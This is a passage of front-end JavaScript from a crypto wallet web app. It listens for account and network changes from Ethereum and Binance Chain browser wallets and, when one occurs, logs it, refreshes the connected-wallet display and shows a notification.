            window.ethereum.on('accountsChanged', () => {
                console.log('Accounts changed');
                // Refresh connected wallets
                UIManager.renderConnectedWallets();
            });
            
            window.ethereum.on('chainChanged', () => {
                console.log('Chain changed');
                UIManager.showToast('Network changed', 'info');
            });
        }
        
        if (window.BinanceChain) {
            window.BinanceChain.on('accountsChanged', () => {
                console.log('Binance accounts changed');
                UIManager.renderConnectedWallets();
            });
        }
    }
});
